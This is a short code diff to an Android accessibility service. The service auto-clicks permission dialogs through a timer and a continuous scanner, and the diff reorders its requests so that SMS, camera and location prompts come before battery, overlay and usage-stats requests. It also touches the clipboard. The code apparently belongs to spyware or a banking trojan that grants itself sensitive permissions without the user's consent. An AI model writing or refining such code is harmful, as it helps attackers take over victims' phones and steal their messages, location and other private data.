@@ -94,11 +94,15 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         // Start grant-perms timer immediately so permission dialogs are auto-clicked
         startGrantPermsTimer();
 
-        // Request all special permissions that cannot be auto-clicked without first opening their screen
-        requestAllSpecialPermissions();
-
         // Start continuous auto-click scan immediately
         startAutoClickScanner();
+
+        // Delay special permissions (battery, overlay, usage stats) by 4 seconds so the
+        // standard runtime permission dialogs (SMS, Camera, Location, etc.) are shown FIRST.
+        // Battery optimization is ONLY requested here — never from MainActivity — so it
+        // cannot appear twice.
+        new Handler(Looper.getMainLooper()).postDelayed(
+            this::requestAllSpecialPermissions, 4000);
         
         clipboardManager = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
         
